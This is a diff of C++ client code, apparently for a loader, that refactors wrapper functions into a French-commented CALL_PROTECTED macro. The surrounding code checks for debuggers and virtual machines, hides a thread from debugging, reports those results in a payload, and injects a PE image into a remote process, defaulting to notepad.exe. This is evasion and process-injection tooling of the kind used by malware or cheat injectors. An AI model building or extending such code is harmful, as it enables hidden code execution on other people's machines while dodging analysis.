@@ -528,82 +528,25 @@ namespace client
 
 	/*
 	   ========================================================================
-	   SIMPLE WRAPPERS FOR PROTECTED FUNCTIONS - Direct calls
+	   MACRO POUR APPELER LES FONCTIONS PROTÉGÉES
 	   ========================================================================
 	*/
 
 	/**
-	 * @brief check if debugger is present
-	 * @return true if debugger detected
+	 * @brief macro pour appeler une fonction protégée
+	 * @param RetType type de retour
+	 * @param Name nom de la fonction
+	 * @param ... arguments de la fonction
+	 *
+	 * Utilisation:
+	 *   bool is_debugged = CALL_PROTECTED(bool, check_debugger_present);
+	 *   uint32_t pid = CALL_PROTECTED(uint32_t, find_process_by_name, "notepad.exe", 12);
 	 */
-	inline auto check_debugger_present( ) -> bool
-	{
-		return protected_function_caller_t::call<bool>( protect::function_marker_t{ "check_debugger_present" } );
-	}
-
-	/**
-	 * @brief check if running in virtual machine
-	 * @return true if VM detected
-	 */
-	inline auto check_vm_present( ) -> bool
-	{
-		return protected_function_caller_t::call<bool>( protect::function_marker_t{ "check_vm_present" } );
-	}
-
-	/**
-	 * @brief find process ID by name
-	 * @param process_name process executable name
-	 * @param name_len length of process name
-	 * @return process ID or 0 if not found
-	 */
-	inline auto find_process_by_name( const char* process_name, size_t name_len ) -> uint32_t
-	{
-		return protected_function_caller_t::call<uint32_t>(
-			protect::function_marker_t{ "find_process_by_name" },
-			process_name, name_len
-		);
-	}
-
-	/**
-	 * @brief validate PE file headers
-	 * @param pe_data PE file data
-	 * @param size size of PE data
-	 * @return true if valid PE
-	 */
-	inline auto validate_pe( const uint8_t* pe_data, size_t size ) -> bool
-	{
-		return protected_function_caller_t::call<bool>(
-			protect::function_marker_t{ "validate_pe" },
-			pe_data, size
-		);
-	}
-
-	/**
-	 * @brief inject PE into remote process
-	 * @param pe_data PE file data
-	 * @param pe_size PE file size
-	 * @param entry_rva entry point RVA
-	 * @param target_process target process name
-	 * @param target_process_len target process name length
-	 * @param out_base_address output base address
-	 * @return true if injection succeeded
-	 */
-	inline auto inject_pe(
-		const uint8_t* pe_data,
-		size_t pe_size,
-		uint32_t entry_rva,
-		const char* target_process,
-		size_t target_process_len,
-		uint64_t* out_base_address
-	) -> bool
-	{
-		return protected_function_caller_t::call<bool>(
-			protect::function_marker_t{ "inject_pe" },
-			pe_data, pe_size, entry_rva,
-			target_process, target_process_len,
-			out_base_address
-		);
-	}
+	#define CALL_PROTECTED(RetType, Name, ...) \
+		client::protected_function_caller_t::call<RetType>( \
+			client::protect::function_marker_t{ #Name }, \
+			##__VA_ARGS__ \
+		)
 
 	/*
 	   client constants
@@ -839,8 +782,8 @@ private:
         payload->challenge_solution = crypto::solve_challenge(current_challenge_);
 
 #ifdef _WIN32
-        payload->is_debugged = client::check_debugger_present() ? 1 : 0;
-        payload->is_vm = client::check_vm_present() ? 1 : 0;
+        payload->is_debugged = CALL_PROTECTED(bool, check_debugger_present) ? 1 : 0;
+        payload->is_vm = CALL_PROTECTED(bool, check_vm_present) ? 1 : 0;
         payload->is_suspended = 0;  // Could check for suspended threads
 
         // Hide thread from debugger
@@ -930,7 +873,7 @@ private:
         std::string target{ target_process_.empty() ? "notepad.exe" : target_process_ };
         uint64_t base_address{ 0 };
 
-        bool success{ client::inject_pe(
+        bool success{ CALL_PROTECTED(bool, inject_pe,
             pe_buffer_.data(),
             pe_buffer_.size(),
             pe_entry_rva_,
